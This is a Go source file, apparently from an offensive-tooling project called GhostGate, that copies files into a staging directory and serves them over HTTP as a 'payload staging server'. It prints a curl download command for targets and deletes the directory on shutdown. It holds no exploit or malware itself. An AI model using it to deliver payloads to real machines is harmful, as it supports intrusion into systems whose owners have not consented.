package essentail

import (
	"GhostGate/internal/filesystem"
	"GhostGate/internal/networking"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
)

// Function for staging the payload directory
func StagePayloadDirectory(port string, stagingDir string, sourceDir string) {
	// Function to close and delete the staging dir
	defer func() {
		fmt.Printf("\n[*] Cleaning up: Removing staging directory: %s\n", stagingDir)
		if err := os.RemoveAll(stagingDir); err != nil {
			fmt.Printf("[-] Error cleaning up directory: %v\n", err)
		}
	}()

	// Creates the staging diredctory if it doesnt exist
	if _, err := os.Stat(stagingDir); os.IsNotExist(err) {
		// Stores the errors from creating the directory
		err := os.MkdirAll(stagingDir, 0755)

		// Checks if there is a error
		if err != nil {
			log.Fatal("Error creating directory:", err)
		}
	}

	// Checks for if source directory was supplyed
	if sourceDir != "" {
		// Stores the files from the dirtecoru
		// Note: os.ReadDir is used here as it provides the modern, optimized replacement for ioutil.ReadDir
		files, err := os.ReadDir(sourceDir)

		// Catches the errors
		if err != nil {
			// Logs the error
			log.Fatal(err)
		}

		// Loops over the files
		for _, file := range files {
			// Skip directories to avoid copying nested folders directly into CopyFile
			if file.IsDir() {
				continue
			}

			// Gets the names of the files
			name := file.Name()

			// Creates the paths
			srcPath := filepath.Join(sourceDir, name)
			dstPath := filepath.Join(stagingDir, name)

			// Copies the files
			filesystem.CopyFile(srcPath, dstPath)
		}
	}

	// Sets up the os signal channel to intercept termination
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	// Creates the file server handler
	fileServer := http.FileServer(http.Dir(stagingDir))

	// Find a real filename for the preview if possible, otherwise default
	sampleFile := "file"
	if sourceDir != "" {
		if files, _ := os.ReadDir(sourceDir); len(files) > 0 {
			sampleFile = files[0].Name()
		}
	}

	// Outputs information
	fmt.Printf("[*] Go Payload Staging Server running on port %s\n", port)
	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
	// Adjusted path to accurately reflect how http.FileServer exposes the folder root
	fmt.Printf("[*] Target download example: curl -O http://%s:%s/%s\n", networking.GetOutboundIP(), port, sampleFile)

	// Start the server inside a background goroutine so it doesn't block the signals
	go func() {
		err := http.ListenAndServe(":"+port, fileServer)
		// We ignore http.ErrServerClosed because it represents a planned shutdown
		if err != nil && err != http.ErrServerClosed {
			log.Printf("Server failed: %v\n", err)
			// Trigger stop channel if server crashes on its own
			stop <- syscall.SIGTERM
		}
	}()

	// Block here until the user presses Ctrl+C or a termination signal is received
	<-stop
	fmt.Println("[*] Stopping staging server...")
}